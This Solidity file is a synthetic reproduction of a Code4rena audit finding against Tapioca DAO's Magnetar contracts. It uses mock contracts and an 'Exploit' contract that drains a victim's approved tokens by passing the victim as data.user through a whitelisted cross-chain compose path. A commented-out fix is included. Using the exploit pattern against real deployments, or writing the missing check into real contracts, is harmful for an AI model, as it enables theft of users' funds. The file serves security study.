// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-01] MagnetarMintXChainModule.mintBBLendXChainSGL can be
    used to manipulate user positions by abusing whitelist privileges
    (carrotsmuggler, Code4rena 2024-02-tapioca, finding #32312)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: mintBBLendXChainSGL on chain A encodes a compose message
    (DepositAndSendForLockingData) that chain B's whitelisted USDO delivers
    into Magnetar.depositYBLendSGLLockXchainTOLP. That destination function
    trusts msg.sender when Cluster-whitelisted and pulls tokens from
    data.user. mintBBLendXChainSGL never asserts that the compose payload's
    data.user equals the initiating user, so an attacker can set any victim
    as data.user; USDO (whitelisted) executes it and drains the victim's
    tokens into the market on their behalf.

    Reduced to a single-chain simulation of the compose delivery:
      attacker → mintBBLendXChainSGL(victimUser in compose)
               → USDO.deliverCompose → Magnetar.deposit…(data.user=victim)
    @> VULN: no data.user == msg.sender check on the mint/compose path.
//////////////////////////////////////////////////////////////////////////*/

contract Cluster {
    mapping(address => bool) public whitelisted;

    function setWhitelisted(address a, bool v) external {
        whitelisted[a] = v;
    }

    function isWhitelisted(uint32, address a) external view returns (bool) {
        return whitelisted[a];
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @dev Synthetic setup: victim has already approved Magnetar.
    function seedAllowance(address owner, address spender, uint256 amount) external {
        allowance[owner][spender] = amount;
    }
}

struct DepositAndSendForLockingData {
    address user;
    uint256 lendAmount;
}

/// @dev Magnetar destination function invoked by USDO compose on chain B.
contract MagnetarAssetXChainModule {
    Cluster public cluster;
    MockERC20 public token;
    mapping(address => uint256) public lentOf; // market position stand-in

    constructor(Cluster c, MockERC20 t) {
        cluster = c;
        token = t;
    }

    function _checkSender(address _from) internal view {
        if (_from != msg.sender && !cluster.isWhitelisted(0, msg.sender)) {
            revert("Magnetar_NotAuthorized");
        }
    }

    /// @notice depositYBLendSGLLockXchainTOLP reduced: pulls tokens from data.user.
    function depositYBLendSGLLockXchainTOLP(DepositAndSendForLockingData memory data) public {
        _checkSender(data.user);
        // Pulls tokens from the user (victim) into the market via Magnetar allowance.
        token.transferFrom(data.user, address(this), data.lendAmount);
        lentOf[data.user] += data.lendAmount;
    }
}

/// @dev USDO stand-in: whitelisted, delivers compose messages to Magnetar.
contract USDO {
    MagnetarAssetXChainModule public magnetar;

    constructor(MagnetarAssetXChainModule m) {
        magnetar = m;
    }

    function deliverCompose(DepositAndSendForLockingData memory data) external {
        // On chain B, USDO (whitelisted) calls Magnetar with the compose payload.
        magnetar.depositYBLendSGLLockXchainTOLP(data);
    }
}

/// @notice mintBBLendXChainSGL reduced: builds compose without binding data.user.
contract MagnetarMintXChainModule {
    USDO public usdo;

    constructor(USDO u) {
        usdo = u;
    }

    /// @dev Attacker-controlled lendSendParams.composeMsg.user is not constrained.
    function mintBBLendXChainSGL(address /*initiator*/, DepositAndSendForLockingData memory lendData)
        external
    {
        // FIX: require(lendData.user == msg.sender, "user mismatch");
        // Cross-chain compose delivery (same-chain simulation via USDO).
        usdo.deliverCompose(lendData); // @> VULN: compose data.user not bound to initiator
    }
}

contract Exploit {
    Cluster public cluster; // 1
    MockERC20 public token; // 2
    MagnetarAssetXChainModule public magnetar; // 3
    USDO public usdo; // 4
    MagnetarMintXChainModule public mintModule; // 5

    address public constant VICTIM = address(0x5151);
    uint256 public constant AMOUNT = 100 ether;

    constructor() {
        cluster = new Cluster(); // 1
        token = new MockERC20(); // 2
        magnetar = new MagnetarAssetXChainModule(cluster, token); // 3
        usdo = new USDO(magnetar); // 4
        mintModule = new MagnetarMintXChainModule(usdo); // 5

        // USDO is whitelisted (cross-chain compose executor).
        cluster.setWhitelisted(address(usdo), true);

        // Victim holds tokens and has approved Magnetar (precondition).
        token.mint(VICTIM, AMOUNT);
        // Victim → Magnetar allowance: need victim to approve. Seed via a helper.
        token.seedAllowance(VICTIM, address(magnetar), AMOUNT);
    }

    function run() external {
        require(token.balanceOf(VICTIM) == AMOUNT, "victim funded");
        require(magnetar.lentOf(VICTIM) == 0, "no position yet");

        // Attacker initiates mintBBLendXChainSGL with compose.user = VICTIM.
        DepositAndSendForLockingData memory lendData =
            DepositAndSendForLockingData({user: VICTIM, lendAmount: AMOUNT});
        mintModule.mintBBLendXChainSGL(address(this), lendData);

        // HARM: victim's tokens pulled into Magnetar/market without their action
        // on this chain — attacker manipulated their position via whitelist.
        require(token.balanceOf(VICTIM) == 0, "victim drained");
        require(magnetar.lentOf(VICTIM) == AMOUNT, "forced lend on victim");
        require(token.balanceOf(address(magnetar)) == AMOUNT, "tokens at magnetar");
    }
}
